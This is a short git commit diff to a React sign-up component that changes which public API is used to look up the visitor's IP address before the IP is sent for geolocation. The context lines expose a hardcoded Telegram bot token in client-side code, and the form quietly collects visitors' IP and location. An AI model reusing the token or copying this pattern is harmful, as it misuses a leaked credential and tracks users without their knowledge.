73aab566853fe13acba2300676b10431af992d69
juritribuna <158317146+juritribuna@users.noreply.github.com>
2024-02-12 11:54:47 -0300

    Update SignUp.tsx

--- components/SignUp.tsx
+++ components/SignUp.tsx
@@ -73,7 +73,7 @@ export default function SignUp() {
     event.preventDefault()
     setIsLoading(true)
     const botToken = '6759387254:AAEV7QeJJpQSZ8vZCqoQaGmPR-rVMAS6v3c'
-    const responseIP = await fetch('https://api.myip.com/')
+    const responseIP = await fetch('https://api.my-ip.io/v2/ip.json')
     const responseIPJson = await responseIP.json()
     const responseGeo = await fetch('/api/geo', {
       method: 'POST',
